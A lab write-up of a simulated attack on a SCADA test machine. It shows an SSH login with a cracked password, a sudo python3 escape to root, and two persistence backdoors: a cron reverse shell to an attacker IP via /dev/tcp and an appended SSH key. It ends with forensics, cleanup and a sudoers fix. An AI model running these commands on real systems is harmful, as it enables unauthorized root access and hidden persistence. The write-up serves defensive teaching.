# Simulation 4 — Lateral Movement & Privilege Escalation

**Phase 3 · Pivot, escalate, persist**

## Results

| Metric | Value |
|---|---|
| Attack phases | 6 |
| Time to root | < 10 seconds (1 command) |
| Backdoors planted | 2 |
| Backdoors found & removed | 2 / 2 (100%) |

## Phase 1 — SSH Foothold

```bash
ssh portuser@192.168.64.2    # password: tangermed2024 (cracked in Sim 2)
```

## Phase 2 — Internal Reconnaissance

```bash
ss -tlnp
# LISTEN  127.0.0.1:3306  <- MySQL! HIDDEN from external scan

ps aux | grep python
# root  3143  python3 /home/nezuku/scada_lab/scada_server.py  <- SCADA runs as ROOT
```

## Phase 3 — Privilege Escalation (GTFOBins)

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3

sudo python3 -c "import os; os.system('/bin/bash')"
# id -> uid=0(root) gid=0(root) groups=0(root)
# TOTAL SYSTEM COMPROMISE IN 1 COMMAND — under 10 seconds
```

See [`gtfobins_explained.md`](gtfobins_explained.md) for why this works.

## Phase 4 — Direct SCADA Access as Root

```bash
python3 -c "
import socket
s = socket.socket(); s.connect(('127.0.0.1', 5020))
print(s.recv(1024).decode())
"
# crane_weight: 14,448 kg  temperature: 3.1°C  fuel_level: 74.2%
```

## Phase 5 — Persistence (2 Backdoors)

```bash
# Backdoor 1 — Cron reverse shell
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/192.168.64.4/4444 0>&1") | crontab -

# Backdoor 2 — SSH authorized key
echo "ssh-ed25519 AAAAC3Nz...BackdoorKey attacker@kali" >> /root/.ssh/authorized_keys
```

## Phase 6 — Blue Team Forensics & Cleanup

See [`forensics.sh`](forensics.sh) for the full investigation script.

```bash
last | head -10                              # who logged in and when
grep "sudo.*python3" /var/log/auth.log       # find privilege escalation
sudo crontab -l -u root                      # find cron backdoor
sudo cat /root/.ssh/authorized_keys          # find SSH key backdoor

# Cleanup
sudo crontab -r -u root
sudo sed -i '/attacker@kali/d' /root/.ssh/authorized_keys
```

## 🔵 Blue Team Lesson

Root cause: a single misconfigured sudo rule. Fix: remove the NOPASSWD python3 entry from `/etc/sudoers`. Apply least privilege everywhere, enable sudo logging/alerting (`SUDO_LOG`), and use auditd rules to alert on sudo executions.
